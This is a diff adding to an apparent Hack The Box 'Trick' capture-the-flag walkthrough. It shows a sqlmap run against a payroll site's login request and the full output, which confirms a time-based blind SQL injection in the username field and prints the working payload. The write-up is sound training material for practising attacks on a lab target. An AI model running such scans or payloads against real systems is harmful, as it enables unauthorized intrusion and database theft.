@@ -102,6 +102,75 @@ username=test&password=test
 
 ```
 
+```
+sqlmap -r req.txt --batch 
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:41:32 /2026-09-16/
+
+[08:41:32] [INFO] parsing HTTP request from 'req.txt'
+[08:41:32] [INFO] testing connection to the target URL
+[08:41:32] [INFO] testing if the target URL content is stable
+[08:41:33] [INFO] target URL content is stable
+[08:41:33] [INFO] testing if POST parameter 'username' is dynamic
+[08:41:33] [WARNING] POST parameter 'username' does not appear to be dynamic
+[08:41:33] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[08:41:33] [INFO] testing for SQL injection on POST parameter 'username'
+[08:41:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:41:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:41:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:41:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[08:41:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[08:41:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[08:41:35] [INFO] testing 'Generic inline queries'
+[08:41:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[08:41:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[08:41:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[08:41:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[08:41:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:41:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:41:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[08:41:47] [INFO] target URL appears to have 8 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[08:41:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[08:41:52] [INFO] target URL appears to be UNION injectable with 8 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[08:41:56] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
+---
+[08:42:12] [INFO] the back-end DBMS is MySQL
+[08:42:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[08:42:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+[08:42:17] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 08:42:17 /2026-09-16/
+
+```
+
+### Database Enumeration
+
+
+
 ---
 ## User Flag
 
